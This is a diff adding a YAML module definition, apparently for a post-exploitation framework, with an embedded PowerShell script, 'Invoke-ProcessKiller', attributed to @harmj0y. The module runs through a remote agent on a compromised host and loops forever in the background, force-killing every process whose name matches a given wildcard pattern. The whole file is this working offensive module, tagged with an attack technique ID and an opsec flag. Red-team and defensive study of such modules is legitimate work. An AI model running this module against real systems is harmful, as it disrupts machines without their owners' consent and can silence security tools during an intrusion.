@@ -1,0 +1,63 @@
+name: Invoke-ProcessKiller
+authors:
+  - '@harmj0y'
+description: Kills any process starting with a particular name.
+software: ''
+techniques:
+  - T1491
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments: [ ]
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: ProcessName
+    description: Process name to kill on starting (wildcards accepted).
+    required: true
+    value: ''
+  - name: Sleep
+    description: Time to sleep between checks.
+    required: true
+    value: '1'
+  - name: Silent
+    description: Switch. Don't output kill messages.
+    required: false
+    value: ''
+script: |
+  function Invoke-ProcessKiller {
+      [CmdletBinding()]
+      Param (
+          [Parameter(Mandatory = $True, Position = 0)]
+          [ValidateNotNullOrEmpty()]
+          [String]
+          $ProcessName,
+
+          [Parameter(Position = 1)]
+          [Int]
+          $Sleep = 1,
+
+          [Parameter(Position = 2)]
+          [Switch]
+          $Silent
+      )
+
+      "Invoke-ProcessKiller monitoring for $ProcessName every $Sleep seconds"
+
+      while($true){
+          Start-Sleep $Sleep
+
+          Get-Process $ProcessName | % {
+              if (-not $Silent) {
+                  "`n$ProcessName process started, killing..."
+              }
+              Stop-Process $_.Id -Force
+          }
+      }
+  }
+script_end: Invoke-ProcessKiller {{ PARAMS }}
